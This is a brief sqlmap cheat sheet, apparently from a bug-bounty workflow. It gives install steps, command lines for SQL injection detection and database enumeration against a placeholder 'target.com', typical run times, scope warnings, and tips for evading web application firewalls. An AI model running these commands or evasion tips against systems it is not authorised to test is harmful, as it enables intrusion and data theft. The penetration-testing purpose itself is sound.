# sqlmap

## Repo
https://github.com/sqlmapproject/sqlmap

## Installation
```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
# run: python3 sqlmap.py

sudo apt install sqlmap
```

## Using
```bash
# Basic GET
python3 sqlmap.py -u "https://target.com/page?id=1" --batch

# POST / forms
python3 sqlmap.py -u "https://target.com/login" --data "user=a&pass=b" --batch

# Crawl + forms
python3 sqlmap.py -u "https://target.com" --crawl=2 --forms --batch

# Database enumeration
python3 sqlmap.py -u "https://target.com/page?id=1" --dbs --batch
python3 sqlmap.py -u "https://target.com/page?id=1" -D dbname --tables --batch
```

## Real-time usage (typical)
| Scope | Duration | Notes |
|-------|----------|-------|
| Single param detection | 30 s – 5 min | --batch |
| Full DB enum | 5 – 30+ min | depends on technique |
| Crawl + multi-form | 10 – 60 min | --crawl=2 |
| Slow/time-based blind | can be hours | avoid on large targets |

Prefer targeted params only. Never run unrestricted crawl on production without explicit scope.

## Current Step
SQL injection detection and exploitation on candidate parameters.

## Next Step
If confirmed, extract data carefully within program scope. Produce clean PoC for report.

## Errors Fixes
- WAF blocks → --tamper=space2comment,between --random-agent
- Connection issues → --timeout=15 --retries=3
- Missed detection → --level=5 --risk=3
- Python version → always use python3
